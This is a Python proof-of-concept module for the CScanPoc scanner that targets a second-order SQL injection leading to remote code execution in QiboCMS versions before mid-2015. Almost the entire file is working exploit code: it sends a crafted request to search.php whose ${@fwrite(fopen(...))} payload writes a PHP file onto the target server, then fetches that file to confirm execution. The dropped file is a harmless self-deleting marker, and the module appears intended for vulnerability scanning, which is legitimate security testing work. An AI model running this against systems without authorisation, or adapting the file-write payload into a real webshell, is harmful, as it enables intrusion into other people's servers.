# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import string
import hashlib


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0020'  # 平台漏洞编号，留空
    name = '齐博分类系统 远程代码执行漏洞洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-07-10'  # 漏洞公布时间
    desc = '''
        齐博CMS前身是龙城于大学期间也即2003年所创建的PHP168网站管理系统，它是国内主流CMS系统之一，曾多次被新浪网、腾讯网、凤凰网等多家大型IT媒体报道。齐博CMS目前已有数以万计的用户在使用，覆盖政府、 企业、科研教育和媒体等各个领域。
        QiboCMS 存在二次SQL注入导致的命令执行，可GetShell.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = '<2015.06.30'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'dfe399e1-f0fa-44fc-acf4-e6a5d7a26abe'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #target = args['options']['target']
            first_url = self.target + "/search.php"
            secend_url = self.target + "/do/jf.php"

            rand_num = random.uniform(10000, 99999)
            hash_num = hashlib.md5(str(rand_num)).hexdigest()
            shell_url = self.target + '/do/%d.php' % rand_num

            payload = ("action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack="
                       "jfadmin&action=addjf&list=1&fid=1&Apower[jfadmin_mod]=1&title=%s&"
                       "content=${@fwrite(fopen('%d.php', 'w+'), '<?php var_dump(md5(123));"
                       "unlink(__FILE__);?>')}") % (hash_num, rand_num)

            requests.get(first_url + '?' + payload)
            if hash_num in requests.get(secend_url).text:
                print('[*] Checking')

            if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
